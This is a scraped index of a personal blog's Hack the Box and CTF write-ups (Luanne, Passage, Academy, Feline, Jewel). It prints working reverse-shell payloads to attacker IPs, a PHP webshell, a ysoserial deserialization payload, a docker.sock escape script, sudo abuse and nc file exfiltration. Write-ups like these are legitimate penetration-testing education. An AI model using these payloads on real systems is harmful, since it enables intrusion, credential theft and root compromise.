Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"Revision More or less like the other git challenges. I tried to script out some of it but for whatever reason every time I tried to greab the SHA’s of the blobs it didnt’ pull all of them. Either way, you can see what I was trying to do first and then when that didn’t work I just pulled the repo to Github desktop and looked at the revisions manually. Try 1 #!/bin/bash while read x; do git cat-file -p \"$x\" \u003e\u003e output.txt done \u003c ~/Downloads/Revision/sha.txt With this I kept getting incomplete flags such as RS{Iyur1pedh3git_c0ms}. I’ll have to go back and see if I can figure out what was going on. Try2 ","date":"2021-04-12","objectID":"/ritsec2021-misc/:2:0","tags":[],"title":"RITSEC CTF 2021 - Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"Corruption When you try to clone this repo it throws an error that it may be corrupted. After some googling it turns out this is a common error and can possibly be fixed by setting a few git global config options to certain settings. Afterwards I was able to view the revisions to the repo and one of them was the flag. ","date":"2021-04-12","objectID":"/ritsec2021-misc/:3:0","tags":[],"title":"RITSEC CTF 2021 - Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"Enigma The text you’re given is crypted with the Enigma Machine. Turing was one of the scientists to crack it during WW2. Go watch The Imitation Game. ","date":"2021-04-12","objectID":"/ritsec2021-misc/:4:0","tags":[],"title":"RITSEC CTF 2021 - Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"Lorem Ipsum This text is encoded using the Ave Maria cipher. The flag is case sensitive so you have to pay attention to which words are capitalized in the cipher since everything comes out all capitals if you put it into an online decoder. A lot of people though the flag was wrong on this one because they weren’t paying attention. ","date":"2021-04-12","objectID":"/ritsec2021-misc/:5:0","tags":[],"title":"RITSEC CTF 2021 - Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"Hack the Box Luanne Write-up","date":"2021-03-27","objectID":"/luanne/","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"Write-up of Luanne - Difficulty : Easy Rest satisfied with doing well, and leave others to talk of you as they will. -Pythagoras ","date":"2021-03-27","objectID":"/luanne/:0:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"1. Overview Luanne is a NetBSD box running a vulnerable lua web app. The app is also being served out of a user’s home directory. A backup on the computer contains the root password for the box. ","date":"2021-03-27","objectID":"/luanne/:1:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-03-27","objectID":"/luanne/:2:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"2.1 Nmap As always we start off running a port scan with nmap and we see that ports 22, 80, and 9001 are open. nmap -sC -sV -p- -T4 10.129.120.184 Looks like nmap found a disallowed site at /weather on the robots.txt file as well as Supervisor running on port 9001. ","date":"2021-03-27","objectID":"/luanne/:2:1","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"2.2 Websites 2.2.1 Supervisor Next we’ll go check out port 10.129.120.184:9001 in a browser and we get prompted for a username/password. After doing some research into Supervisor default configs we can find that the default credentials of user:123 will allow us to authenticate to the website. If we go to processes we can see something running from r.michaels home directory. It appears to be that weather site that nmap found earlier. 2.2.2 Weather After that we head on over to 10.129.120.184/weather and it doesn’t resolve to anything. If we fuzz for web directories we find /forecast. If we browse to this site we are greeted with a message that no city is specificed and we should use “city=list” to list all available options. Upon doing so by adding ?city=list to the end of our request we can choose any city and get the weather forecast for it. Now that we know how to get the script to work we google for lua rce exploits and find a usefule article by SyHunt. ","date":"2021-03-27","objectID":"/luanne/:2:2","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"3. Foothold Upon reading the article we find that os.execute might allow us to have our code executed on the remote system. After some simple tests we wind up with our reverse shell code that we need to URL encode and pass through the browser. Before sending it we start our reverse shell with nc -lvnp 3001. http://10.129.120.184/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ftest%3Bmkfifo%20%2Ftmp%2Ftest%3Bcat%20%2Ftmp%2Ftest%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.88%203001%20%3E%2Ftmp%2Ftest%22%29--) With that we wind up with a shell as _httpd. ","date":"2021-03-27","objectID":"/luanne/:3:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"4. User Since there’s a website running the first thing to check is /var/www and luckily for us there’s a hidden file .htpasswd that contains credentials for webapi_user. After we copy that hash to our box we can run hashcat against it. We can use these credentials to authenticate to the server on port 3001 and steal r.michales ssh key. curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa There is a backups folder in our user’s home directory where we find devel_backup-2020-09-16.tar.gz.enc. If we google NetBSD .enc files it brings us to the netpgp manual pages. With the help of the man pages we can decrypt this backup and look at it. netpgp --decrypt /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc --output /tmp/test.tar.gz gunzip /tmp/test/tar.gz tar -xvf /tmp/test.tar Just like how we found the previous webapi-user password we can find the backup password in .htpasswd. Following the same steps as before we can crack it with hashcat. ","date":"2021-03-27","objectID":"/luanne/:4:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"5. Root If you’re familiar with NetBSD there is the doas command which acts as an more easily configurable version of sudo. Since sudo is not a known command on this box if we try to run doas sh we are prompted for a password. As with all pentests you should always re-use passwords you find since passwords are commonly used for multiple accounts, against security guidance. Upon entering the password we just found we are granted a shell as root. ","date":"2021-03-27","objectID":"/luanne/:5:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"Conclusion Host web apps from the proper directories. Ensure your backups are properly protected or stored off system. Do not re-use passwords for accounts. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-03-27","objectID":"/luanne/:6:0","tags":["BSD","Lua","HTB"],"title":"Hack the Box - Luanne","uri":"/luanne/"},{"categories":["write-ups"],"content":"Hack the Box Passage Write-up","date":"2021-03-06","objectID":"/passage/","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"Write-up of Passage - Difficulty : Medium “None shall pass.” - “I have no quarrel with you, good Sir Knight, but I must cross this bridge.” - “Then you shall die.” Monty Python and the Holy Grail ","date":"2021-03-06","objectID":"/passage/:0:0","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"1. Overview Passage is a Linux box hosting a blog/news website. The version of CuteNews installed allows for a file upload to RCE. Re-use of account credentials allows for lateral movement in the system. The root account is able to be compromised due to an unpatched version of USBCreator. ","date":"2021-03-06","objectID":"/passage/:1:0","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-03-06","objectID":"/passage/:2:0","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"2.1 Nmap As always we start off running a port scan with nmap and we see that ports 22 and 80 are open. The http title on 80 is Passage News. nmap -sC -sV 10.129.108.237 ","date":"2021-03-06","objectID":"/passage/:2:1","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"2.2 Website 2.2.1 Passage News First thing we need to do is check out the website on port 80. We can do that by simply browsing to it in Firefox. The site appears to be some type of message board. All the posts are filler text except for the “Implemented Fail2Ban” post which just states that fail2ban has been installed. If we run gobuster against this site our IP address will get banned for roughly five minutes. At the bottom of the page is a reference to CuteNews and a link to their website. After poking around for a little while and not getting anywhere it’s time to look at the documentation for Cute News. The documentation mentioned a dashboard at /CuteNews. When we go to that site we’re able to register for an account and login. After some more enumeration there doesn’t appear to be much info to grab. We can see that the version of Cute News running is 2.1.2. After some googling we wind up with CVE-2019-11447. ","date":"2021-03-06","objectID":"/passage/:2:2","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"3. Foothold The CVE we found allows us to upload an image file with php code commented into the image and have the server execute it. This vulnerability can be used for us to gain a foothold. We can use any image file and add a comment with exiftool that allows us to run commands by putting the command in a GET request. exiftool -comment='\u003c?php echo system($_GET['cmd']); ?\u003e' We change the extension to .php and upload it as an avatar to the user account that we created earlier. With this uploaded we’re able to navigate to our file and run some commands, such as id to see who we’re running commands as and ls /bin to see what’s installed on the server. http://10.129.108.237/CuteNews/uploads/avatar_test_passage.php?cmd=id http://10.129.108.237/CuteNews/uploads/avatar_test_passage.php?cmd=ls+/bin With these commands we can see that we’re running as www-data and that nc and nc.traditional are installed on the server. Knowing that, we can simply use netcat to call back to a listener we set up on our box. We set up our listener with nc -lvnp 1234 and use the following url encoded command in our browser to connect to it. http://10.129.108.237/CuteNews/uploads/avatar_test_passage.php?cmd=nc%2010.10.14.24%201234%20-e%20%2Fbin%2Fbash ","date":"2021-03-06","objectID":"/passage/:3:0","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"4. Privilege Escalation ","date":"2021-03-06","objectID":"/passage/:4:0","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"4.1 First user As usual when a website is running we want to check out /var/www/html to see if anything is left there for us to find. In /var/www/html/CuteNews/cdata/users we find bunch of files that have base64 encrypted strings in them. To easily move these to our machine we ran cat * \u003e hash.txt and then moved the file over to our box with netcat. on attack box nc -lvnp 2345 \u003e hash.txt on victim box nc -w 3 10.10.14.24 2345 \u003c hash.txt Now we just remove extra data from the file and decode the base64 with cat hash.txt|base64 -d \u003e hash2.txt. Once that’s complete we can run hashcat against the new hashes we found to see if anything is useful. hashcat -m 1400 -a 0 hash2.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt And since we found a couple passwords let’s run getent passwd to find our users. We try the passwords for our users nadav and paul. A simple su to paul and we have our first user and the user flag in the home directory. ","date":"2021-03-06","objectID":"/passage/:4:1","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"4.2 Second User Since we all know that users like to re-use things it’s always a good practice to attempt to use what you already have to access other user accounts. Neither of the passwords seem to work for nadav so let’s try using paul’s SSH key to get in. We copied his private key over with nc using the same command as our previous transfer. We attempt to SSH in with the key as nadav and we get right in. ","date":"2021-03-06","objectID":"/passage/:4:2","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"4.3 Root Running groups as nadav reveals that he’s a member of quite a few things. First thing’s first, however, so let’s go check out his home directory. A simple ls -a and we find a hidden .viminfo file with some useful information in it. Nadav has been making some changes to something called dbus-1/…/USBCreator.conf. If we do some more googling we wind up at USCreator Privilege Escalation which should allow use to overwrite arbitrary files on the system without password prompt so long as we are in the sudo group. Sounds like a plan. Instead of copying our key over the victim host we’ll just use nadav’s since we already have the private key on our attack box. cat ~/.ssh/id_rsa.pub \u003e\u003e ~/.ssh/authorized_keys gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true Simple as that we have root access to the box. ","date":"2021-03-06","objectID":"/passage/:4:3","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"Conclusion Ensure your software is up to date. Both attack vectors could be eliminated by installing required patches or updating to the newest version of the effected software. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-03-06","objectID":"/passage/:5:0","tags":["Linux","Web","PHP","CVE","HTB"],"title":"Hack the Box - Passage","uri":"/passage/"},{"categories":["write-ups"],"content":"Hack the Box Academy Write-up","date":"2021-02-27","objectID":"/academy/","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"Write-up of Academy - Difficulty : Easy Learning Never Exhausts the Mind -Leonardo da Vinci ","date":"2021-02-27","objectID":"/academy/:0:0","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"1. Overview Academy is a Linux box hosting an educational website. There is a form manipulation vulnerability to set yourself as an admin. After logging in as admin you are able to exploit a Laravel vulnerability to gain access to the box as www-data. An old environment file has some saved passwords that are readable to our user. Using that to login as the second user and find another password in the log files. Afterwards we’re able to use GTFObins to escalate to root. ","date":"2021-02-27","objectID":"/academy/:1:0","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-02-27","objectID":"/academy/:2:0","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"2.1 Nmap As always we start off running a port scan with nmap and we see that ports 22 and 80 are open. There is also redirect happening on port 80 to http://academy.htb. nmap -sC -sV -T4 10.129.104.52 ","date":"2021-02-27","objectID":"/academy/:2:1","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"2.2 Website 2.2.1 Academy.htb First thing we need to do is add academy.htb to our /etc/hosts file so we’re able to access the website. After we do that we can just browse to the website and see what’s there. The only thing there is a login page and a register page, so after we register with random credentials ( I used test:test123 ) we’re able to access the site. It looks like we’re logged in as egre55 but there’s not too many useful things to interact with on the site. Like most sites we should run gobuster or ffuf against it to see what other pages there are that we can access. gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://academy.htb/ -x php We can see that there’s an /admin.php page. If we go there it’s just a normal login page and the credentials for the account we created earlier don’t appear to let us in. Let’s go back to that first register page and take a closer look at what’s going on with Burp If we change the role id from a 0 to a 1 it may give us a different role type for our account With this new account let’s go back and see if we can login to that admin site. After logging in as admin there is a to-do list that we can look at. At the bottom of the list it looks like there’s another website that we can access at dev-staging-01.academy.htb Time to go back and add that new site to our /etc/hosts file like we did at the start. 2.2.2 Dev-staging-01 After we navigate to dev-staging-01.academy.htb we can see multiple errors being thrown at us for this staging site. If we look through some of them we see some mentions of Laravel which is our path to a foothold. Doing some research we wind up at CVE-2018-15133. This vulnerabiltiy allows for remote code execution as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This vulnerability requires us to know the application key and thankfully for us it was divulged in the previous step. Luckily there’s also a Metasploit module for this specific exploit. ","date":"2021-02-27","objectID":"/academy/:2:2","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"3. Foothold After we start up Metasploit we can use the exploit /unix/http/laravel_token_unserialize_exec. Once we fill out all the required option, ensuring that we copy the APP_KEY from the prior step, and put in the correct vhost we can just type run and let Metasploit do its thing. Looks like it was able to come back with a shell as www-data. ","date":"2021-02-27","objectID":"/academy/:3:0","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"4. Privilege Escalation ","date":"2021-02-27","objectID":"/academy/:4:0","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"4.1 First user We ran LinPEAS to see if there was any easy avenue for escalation but from what it looked like there wasn’t. After doing some manual poking around in the default directories we found /var/www/html/academy/.env which had a saved password in there for a MySQL database. Well we have a password, so let’s run getent passwd and maybe ls /home to see what users on the box and who has a home directory. After trying the password on a few accounts we found that it was the correct login for the user cry0l1t3. Since we have the password we can just SSH in as that user. Cry0l1t3 happens to be the user with the user flag in their home directory so we can easily grab that on our way to root. ","date":"2021-02-27","objectID":"/academy/:4:1","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"4.2 Second User After doing some more enumeration as Cry0l1t3 we can see that he’s a member of the adm group which is the group that has read access to the log files in /var/log. If we take a look in there and spend some time perusing the files we wind up at /var/log/audit/audit.log.3 where an su command was executed and some data was captured in hexadecimal form. We can take that hex string to any number of online decoders and it will come back as mrb3n_Ac@d3my!. Looks like this is the password for mrb3n. We can just do a simple ** su - mrb3n** to switch over to our newly acquired user account. Thankfully mrb3n is able to use the sudo command. So let’s list what he can do with it with a sudo -l command. Looks like he’s able to run composer as root. Easy enough, let’s hop over to GTFObins once again and see what it has for composer. We can run the below command and hop over to root to grab the root flag. TF=$(mktemp -d) echo '{\"scripts\":{\"x\":\"/bin/sh -i 0\u003c\u00263 1\u003e\u00263 2\u003e\u00263\"}}' \u003e$TF/composer.json sudo composer --working-dir=$TF run-script x ","date":"2021-02-27","objectID":"/academy/:4:2","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"Conclusion Ensure your registration procedures are secure. There’s no reason for someone to be able to self-register as an admin. The creator of the site, or current admins, can create additional accounts for new people. Update your software. This CVE was relatively old at the time of use so an administrator should have had more than enough time to update their systems. Don’t re-use passwords accross multiple accounts. Ensure you protect audit logs correctly as they normally hold valuable information. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-02-27","objectID":"/academy/:5:0","tags":["Linux","Web","Burp","GTFObins","CVE","HTB"],"title":"Hack the Box - Academy","uri":"/academy/"},{"categories":["write-ups"],"content":"Hack the Box Feline Write-up","date":"2021-02-20","objectID":"/feline/","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"Write-up of Feline - Difficulty : Hard Better to live one year as a tiger, then a hundred as sheep. -Madonna Ciccone Bug Hack the Box was having problems and I had to reset my VPN connection halfway through. The IP addresses for my parrot box and for Feline change but it should still be easy to follow along. ","date":"2021-02-20","objectID":"/feline/:0:0","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"1. Overview Feline is another Linux box running a simple website. There is an upload deserialization vulnerability that leads to remote code execution. A local port is running an out of date, exploitable version of Saltstack. A to-do list was left in the docker root’s home directory that referenced docker.sock. Escaping from the docker container using docker.sock allowed us to gain root access on the box. ","date":"2021-02-20","objectID":"/feline/:1:0","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-02-20","objectID":"/feline/:2:0","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"2.1 Nmap As always we start off running a port scan with nmap and we see that ports 22 and 8080 are open. There appears to be a website called VirusBucket being hosted by Apache on port 8080. Apache is also out of date. nmap -sC -sV -T4 10.129.105.79 ","date":"2021-02-20","objectID":"/feline/:2:1","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"2.2 Website 2.2.1 VirusBucket Next we’ll go check out what sites those webservers are hosting. If we open our browser and go to 10.129.105.79:8080 which brings us to the front page of the VirusBucket website After we do some poking around we wind up on /service/ where the website allows us to upload files to be analyzed. After which the website says it will email us with a generated report. The website allows us to upload pretty much anything, but to really see what’s going on we need to open up Burp and set Firefox to use it as our proxy. After uploading a few documents and messing with the parameters we found out that if you change the file name to a single period and you’ll get a useful error. Looks like the files are being uploaded into /opt/samples/uploads/. If we take a look at the rest of the error message we can see some sort of java deserialization going on. If we do a bit of googling we wind up at CVE-2020-9484 which is a Tomcat deserialization vulnerability which allows for remote code execution (RCE). ","date":"2021-02-20","objectID":"/feline/:2:2","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"3. Foothold If we take a look at this write-up explaining the exploit by RedTimmy. If you don’t already have ysoserial installed you’re going to need it. echo \"bash -i \u003e\u0026 /dev/tcp/10.10.14.56/1234 0\u003e\u00261\" |base64 $payload=\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ni8xMjM0IDA+JjEK}|{base64,-d}|{bash,-i}\" java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 \"${payload}\" \u003e hcky.session All we have to do next is upload it with a simple curl command to the same location we saw with Burp. curl -F 'image=@hcky.session' http://10.129.105.79:8080/upload.jsp And then call that file we just uploaded by putting the path to the file in the JSESSIONID while we have our netcat listener running. As soon as we send the next curl command we should get a callback and a shell. Thankfully it turns out that the account that we got a shell as is the user Tomcat and he has read access to the user.txt flag in his /home/ directory. ","date":"2021-02-20","objectID":"/feline/:3:0","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"4. Privilege Escalation Info This is where the IP changed to 10.129.100.82 for Feline and 10.10.14.101 for my Parrot box. After doing some manual enumeration nothing major seemed to pop out at us. Part of the process should always be checking what ports are listening on the box so we run a netstat -ant and see what comes up. Looks like there’s something listening on ports 4505/4506. After some googling we found that this is Saltstack which had a recent RCE vulnerability recently advertised as CVE-2020-11651 and there’s even a PoC exploit available on Github written by jasperla You’ll need to clone the repo and possible install Salt if you don’t have it installed already. Since the ports are only listening locally we decided to use chisel to do some port forwarding and gain access to port 4506 of Feline like we were running locally. We served out the chisel file with python3 -m http.server and grabbed it as the tomcat user. Next we started the chisel client and server. FELINE- ./chisel client 10.10.14.101:4242 R:4506:127.0.0.1:4506 ATTACKBOX chisel server -p 4242 --reverse Now that we have chisel connected all we have to do is start our netcat listener and run the exploit.py that we cloned earlier. python3 exploit.py --master 127.0.0.1 --exec 'bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.101/1234 0\u003e\u00261\"' Just like that we have root, well… a root. ","date":"2021-02-20","objectID":"/feline/:4:0","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"4.1 Privesc Round 2 So as we can tell, we have root, but it’s inside a docker container. After some enumeration we wound up finding a todo.txt and some commands in .bash_history in root’s home directory. We can see that a few commands were run regarding docker.sock After some more googling we wind up with an article relating to taking over with docker.sock by Dejan Zelic as well as the regular Docker documentation for some sanity checks. This simple-exec-with-docker-remote-ip.sh script by dapplebeforedawn was also useful. A simple script will get us what we need. exploit=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /mnt sh -c \\\\\\\"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.101/2345 0\u003e\u00261'\\\\\\\"\\\"]\" docker=$(curl -s -X POST --unix-socket /var/run/docker.sock --data-binary \"{\\\"Image\\\":\\\"sandbox\\\",\\\"cmd\\\":$exploit, \\\"Binds\\\": [\\\"/:/mnt:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create) ID=$(echo \"$docker\" | cut -d'\"' -f4) curl --silent -X POST --unix-socket /var/run/docker.sock http://localhost/containers/$ID/start sleep 5 curl --silent --unix-socket /var/run/docker.sock \"http://localhost/containers/$ID/logs?stderr=1\u0026stdout=1\" What this should do is create a container, mount the root directory of the host system, start the containter, and then execute the reverse shell that we put in there, giving us a reverse shell on the host machine as root. We host the script with another python http server and pull it to Feline. So we start another netcat listener on an unused port with nc -lvnp 2345 and run our script. As soon as we run the script we should get a shell as root. ","date":"2021-02-20","objectID":"/feline/:4:1","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":["write-ups"],"content":"Conclusion Update your software. The exploits used for foothold and the first root were due to outdated software with known exploits. Know the risks of exposing the docker.sock file. Accept or mitigate as your organization deems necessary. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-02-20","objectID":"/feline/:5:0","tags":["Linux","Java","Deserialization","Docker","CVE","HTB"],"title":"Hack the Box - Feline","uri":"/feline/"},{"categories":[""],"content":"TraceLabs OSINT CTF","date":"2021-02-20","objectID":"/ctf/osint-ctf/","tags":[""],"title":"TraceLabs OSINT CTF","uri":"/ctf/osint-ctf/"},{"categories":[""],"content":" This weekend was my first time competing in TraceLab’s OSINT Searchparty, which is a CTF style event. I wasn’t sure what to really expect going into it since I’ve never done one before. The event was brought up in the WGU Cyber Security Club so we actually had two different teams competing. I was the captain of my team devzero and the other team was called The Fowl Owls. Tracelabs describes the event as The Trace Labs Search Party CTF is a non theoretical, gamified effort that allows for the crowdsourcing of contestants to perform a single task: Conduct open source intelligence operations to help find missing persons. A basic overview of the event is as follows: All teams are given basic information about five missing persons: name, location they went missing, possible aliases/emails, picture. The goal is to perform passive collection to gain as much information about these persons that might aid in building a bigger profile or help to find them. There are no tradional CTF flags, all information gathered can be submitted individually with proof and a judge decides what category it fits into and awards points based on that category. The team with the most flags at the end of the eight hours wins. After the event is over TraceLabs takes the findings and builds reports for the law enforcement agencies that are in charge of the individual cases and provides all the information that was collected. Hopefully these reports help to find the missing persons. Devzero ended up placing 91 out of 290 teams and The Fowl Owls ended up at 131. It was a whole lot harder than I thought it would be but a lot of fun. I definitley plan on being a part of the future events. Word to the wise If you plan on being a part of this event in the future you should make sure that you have your smurf/sock puppet accounts created before the event starts. Making fake accounts for all different social media is time consuming and with all the new security checks that go into them nowadays it’s likely that you’ll get the account banned before you’re even able to make use of it. ","date":"2021-02-20","objectID":"/ctf/osint-ctf/:0:0","tags":[""],"title":"TraceLabs OSINT CTF","uri":"/ctf/osint-ctf/"},{"categories":["CTF"],"content":"TraceLabs OSINT CTF","date":"2021-02-20","objectID":"/osint-ctf/","tags":["CTF","OSINT"],"title":"TraceLabs OSINT CTF","uri":"/osint-ctf/"},{"categories":["CTF"],"content":"This weekend was my first time competing in TraceLab’s OSINT Searchparty, which is a CTF style event. I wasn’t sure what to really expect going into it since I’ve never done one before. The event was brought up in the WGU Cyber Security Club so we actually had two different teams competing. I was the captain of my team devzero and the other team was called The Fowl Owls. Tracelabs describes the event as The Trace Labs Search Party CTF is a non theoretical, gamified effort that allows for the crowdsourcing of contestants to perform a single task: Conduct open source intelligence operations to help find missing persons. A basic overview of the event is as follows: All teams are given basic information about five missing persons: name, location they went missing, possible aliases/emails, picture. The goal is to perform passive collection to gain as much information about these persons that might aid in building a bigger profile or help to find them. There are no tradional CTF flags, all information gathered can be submitted individually with proof and a judge decides what category it fits into and awards points based on that category. The team with the most flags at the end of the eight hours wins. After the event is over TraceLabs takes the findings and builds reports for the law enforcement agencies that are in charge of the individual cases and provides all the information that was collected. Hopefully these reports help to find the missing persons. Devzero ended up placing 91 out of 290 teams and The Fowl Owls ended up at 131. It was a whole lot harder than I thought it would be but a lot of fun. I definitley plan on being a part of the future events. Word to the wise If you plan on being a part of this event in the future you should make sure that you have your smurf/sock puppet accounts created before the event starts. Making fake accounts for all different social media is time consuming and with all the new security checks that go into them nowadays it’s likely that you’ll get the account banned before you’re even able to make use of it. ","date":"2021-02-20","objectID":"/osint-ctf/:0:0","tags":["CTF","OSINT"],"title":"TraceLabs OSINT CTF","uri":"/osint-ctf/"},{"categories":["write-ups"],"content":"Hack the Box Jewel Write-up","date":"2021-02-15","objectID":"/jewel/","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"Write-up of Jewel - Difficulty : Medium Experience is a jewel, and it need be so, for it is often purchased at an infinite rate. -William Shakespeare ","date":"2021-02-15","objectID":"/jewel/:0:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"1. Overview Jewel is a Linux box running gitweb as well as a blog site. This version of gitweb is running a vulnerable version of Ruby on Rails. This CVE allowed for remote code execution (RCE) on the victim box and attain a reverse shell as user Bill. A sqldump accessible by the user in the backup folder allowed us to obtain the password hash for Bill. Cracking the hash and utilizing Bill’s 2FA secret allowed us to break into the root account utilizing the gem command. ","date":"2021-02-15","objectID":"/jewel/:1:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-02-15","objectID":"/jewel/:2:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"2.1 Nmap As always we start off running a port scan with nmap and we see that ports 22, 8000, and 8080 are open. nmap -sC -sV -T4 10.10.10.211 We can see that SSH is open, Apache is running on 8000, and nginx is running on 8080. ","date":"2021-02-15","objectID":"/jewel/:2:1","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"2.2 Websites 2.2.1 Gitweb Next we’ll go check out what sites those webservers are hosting. If we open our browser and go to 10.10.10.211:8000 we get redirected to /gitweb/. It looks like there’s a project called “Bl0G!” We can view the contents of the project by following the hyperlinks and we come to the gem file which tells us the Rails version is 5.2.2.1. After some google research we find that this version of Ruby has a 